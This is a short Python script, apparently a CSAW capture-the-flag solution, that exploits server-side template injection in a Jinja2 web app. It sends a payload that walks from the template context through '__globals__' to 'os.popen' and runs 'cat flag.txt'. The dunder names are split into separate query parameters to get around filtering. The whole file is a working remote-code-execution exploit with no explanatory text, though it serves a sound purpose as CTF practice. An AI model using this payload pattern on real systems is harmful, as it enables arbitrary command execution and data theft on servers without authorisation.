import requests
import urllib.parse

TARGET_URL='http://web.chal.csaw.io:5000/'

def rce(cmd):
    u="_TemplateReference__context"
    u=urllib.parse.quote_plus(u)
    i="__init__"
    i=urllib.parse.quote_plus(i)
    g="__globals__"
    g=urllib.parse.quote_plus(g)
    o="os"
    value="{{ self[request.args.u]['cycler'][request.args.i][request.args.g][request.args.o]['popen']('cat flag.txt').read() }}"
    print(value)
    value=urllib.parse.quote_plus(value)
    query=f"?value={value}&u={u}&i={i}&g={g}&o={o}"
    
    res=requests.get(TARGET_URL+'/submit'+query)

    print(res.text)


rce(1)